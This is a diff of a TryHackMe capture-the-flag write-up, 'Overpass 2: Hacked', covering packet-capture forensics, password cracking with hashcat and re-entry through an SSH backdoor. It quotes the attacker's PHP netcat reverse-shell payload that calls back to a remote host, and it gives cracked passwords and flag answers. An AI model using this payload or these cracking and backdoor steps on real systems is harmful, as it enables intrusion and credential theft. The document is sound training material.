@@ -4,7 +4,7 @@ The flags are structured to basically walk us through this room.
 
 ## Forensics: Analyze the PCAP
 
-I’ve not actually used Wireshark outside of the [TryHackMe: Wireshark 101](tryhackme-wireshark-101.md) “room” (and a few short digressions in other rooms), so I’m honestly a little worried about my abilities here…
+I’ve not actually used Wireshark outside of the TryHackMe: Wireshark 101 “room” (and a few short digressions in other rooms), so I’m honestly a little worried about my abilities here…
 
 Filtering the PCAP file for HTTP requests reveals a single POST from 192.168.179.145 to http://192.168.170.159/development/upload.php. A subsequent request from 192.168.179.145 pulls the directory listing of /development/uploads/, and then GETs /development/uploads/payload.php. This suggests that 192.168.179.145 is the ”attacker” and 192.168.179.145 is the target system.
 
@@ -18,11 +18,11 @@ We can save off this POST request to get at the uploaded payload.php file, which
 
 FLAG 2: What payload did the attacker use to gain access? — `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`
 
-This is popping a simple reverse shell through [netcat](netcat.md) that connects back to 192.168.170.145:4242, which would seem to confirm that this was the machine used by the attacker.
+This is popping a simple reverse shell through netcat that connects back to 192.168.170.145:4242, which would seem to confirm that this was the machine used by the attacker.
 
 This means that penetration occurs when this file is requested in packet 27.
 
-Looking at subsequent TCP packets, we can see what the attacker typed in the packets going from 192.168.170.145 → 192.168.170.159, and the responses in the packets going from 192.168.170.159 → 192.168.170.145. Requests/Responses coming through [netcat](netcat.md) use the TCP PSH flag, so we can filter by `tcp.port == 4242 and tcp.flags.push` to zoom in on this conversation.
+Looking at subsequent TCP packets, we can see what the attacker typed in the packets going from 192.168.170.145 → 192.168.170.159, and the responses in the packets going from 192.168.170.159 → 192.168.170.145. Requests/Responses coming through netcat use the TCP PSH flag, so we can filter by `tcp.port == 4242 and tcp.flags.push` to zoom in on this conversation.
 
 The attacker eventually issues `su james` to elevate privileges  (packet 71), and a few packets down we can see `james`’s password.
 
@@ -34,10 +34,11 @@ FLAG 4: How did the attacker establish persistence? — https://github.com/Ninja
 
 Returning to packet 114, we can use Copy > Copy Bytes as Printable Text to pull the contents of /etc/shadow (+ a little garbage).  After a little cleanup, we have 5 users with passwords (including `james`, which we know already).
 
-We extract the hashes and then throw [Hashcat](hashcat.md) at this using the suggested “fasttrack” wordlist.
+We extract the hashes and then throw Hashcat at this using the suggested “fasttrack” wordlist.
 
 ```bash
-hashcat -m 1800 -O hashes.txt /usr/share/wordlists/fasttrack.txt
+hashcat -m 1800 \
+        -O hashes.txt /usr/share/wordlists/fasttrack.txt
 ```
 
 Four out of the five passwords turn out to be crackable:
@@ -69,10 +70,13 @@ The hashPassword() function here takes the SHA-512 hash of the provided password
 
 FLAG 8: What was the hash that the attacker used? — `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`
 
-We can use [Hashcat](hashcat.md) to again crack this.
+We can use Hashcat to again crack this.
 
 ```bash
-hashcat -m 1710 -O 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05 ~/.local/share/red-team/wordlists/rockyou.txt
+hashcat \
+	-m 1710 \
+	-O 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05 \
+	   ~/.local/share/red-team/wordlists/rockyou.txt
 ```
 
 FLAG 9: What's the password? — `november16`
@@ -83,10 +87,11 @@ The last bit of this CTF uses a server, which for this run is at 10.10.114.161. 
 
 FLAG 10: What message did the attacker leave as a heading when they defaced the website? — H4ck3d by CooctusClan
 
-We’ll get back in using the backdoor that the attacker set up. From the backdoor code we know that the SSH server is running on [port 2222](https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go#L23), and there don’t seem to be any user checks. So…
+We’ll get back in using the backdoor that the attacker set up. From the backdoor code we know that the SSH server is running on port 2222, and there don’t seem to be any user checks. So…
 
 ```bash
-env -u SSH_AUTH_SOCK -u SSH_AGENT_PID ssh -p 2222 user@10.10.114.161
+env -u SSH_AUTH_SOCK -u SSH_AGENT_PID \
+	ssh -p 2222 user@10.10.114.161
 ```
 
 …lets us in as expected (with the password of `november16`).
@@ -95,7 +100,7 @@ The user flag is in /home/james/user.txt.
 
 FLAG 11: What's the user flag? — `thm{d119b4fa8c497ddb0525f7ad200e6567}`
 
-Unfortunately, none of the passwords we cracked earlier work anymore. After checking a couple of [possible](exploiting-bash.md) [exploits](exploiting-vim.md) to get around this, I decided just to see what SUID binaries were on the system (figuring that I’d check them against [GTFOBins](https://gtfobins.github.io/)).
+Unfortunately, none of the passwords we cracked earlier work anymore. After checking a couple of possible exploits to get around this, I decided just to see what SUID binaries were on the system (figuring that I’d check them against GTFOBins).
 
 ```bash
 find / -type f -perm -u+s -exec ls -l "{}" \;
@@ -116,6 +121,13 @@ ELAPSED TIME: 1 h 43 min
 ## References
 
 * [TryHackMe: Overpass 2: Hacked](https://tryhackme.com/room/overpass2hacked)
+* [TryHackMe: Wireshark 101](tryhackme-wireshark-101.md)
+* [Using “netcat”](netcat.md)
+* [Using Hashcat](hashcat.md)
+* [ssh-backdoor / main.go](https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go)
+* [Exploiting Bash](exploiting-bash.md)
+* [Exploiting ViM](exploiting-vim.md)
+* [GTFOBins](https://gtfobins.github.io/)
 
 - - - -
 
